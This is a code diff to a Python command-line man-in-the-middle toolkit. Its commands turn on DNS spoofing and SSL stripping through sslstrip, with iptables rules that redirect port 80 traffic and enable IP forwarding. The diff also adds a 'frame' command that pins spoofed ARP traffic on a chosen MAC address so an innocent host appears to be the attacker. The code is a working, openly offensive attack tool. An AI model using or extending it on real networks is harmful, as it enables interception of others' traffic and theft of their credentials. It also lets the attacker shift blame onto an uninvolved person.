@@ -76,7 +76,7 @@ class SpoofToolCLI(cmd.Cmd):
         
 
     def do_dns_spoof(self, line):
-        """Spoof DNS packets. Run ARP First."""
+        """Spoof DNS packets. Run ARP First.Does not work together with SSL stripping."""
         parser = argparse.ArgumentParser(prog='dns_spoof', description='Spoof DNS packets.')
         parser.add_argument('-m', '--manual', nargs='*', help='Manual input of urls (default: all)')
         parser.add_argument('-i', '--iface', default='enp0s10', help='Network Interface (default: enp0s10)')
@@ -102,13 +102,39 @@ class SpoofToolCLI(cmd.Cmd):
 
     ssl_process = None
     def do_ssl_strip(self, line):
-        """Turns on ssl stripping (using moxie ssl_strip). Run ARP First."""
+        """Turns on ssl stripping (using moxie ssl_strip). Run ARP First. Does not work together with DNS spoofing"""
         os.system("sudo sysctl -w net.ipv4.ip_forward=1")
+        os.system("sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
         os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
         os.system("sudo iptables -A FORWARD -j ACCEPT")
         global ssl_process
         ssl_process = subprocess.Popen("sudo python sslstrip-package/sslstrip.py", shell=True, stderr=open(os.devnull, 'wb'))
         return
+    
+    def do_frame(self, line):   
+        """Frame given mac to be the bad guy. In loud mode takes many IP's. In silent mode just the attacker ip"""
+        parser = argparse.ArgumentParser(prog='frame', description='Frame given mac to be the bad guy.')
+        parser.add_argument('mac', help='MAC address to frame.')
+        parser.add_argument('-l', action='store_true', help="Loud, takes many IP's (default=False)")
+
+        try:
+            args = parser.parse_args(line.split())
+        except SystemExit:
+            return
+        
+        arp_spoofing.framed_mac = args.mac
+
+        if args.l:
+            print("Loud framing mode enabled.")
+            print("Framing MAC address: {}".format(args.mac))
+            arp_spoofing.loud_framing = True
+        else:
+            print("Silent framing mode enabled.")
+            print("Framing MAC address: {}".format(args.mac))
+            arp_spoofing.loud_framing = False
+        
+        arp_spoofing.arp_framing = True
+        
 
 
     def do_clear(self, line):
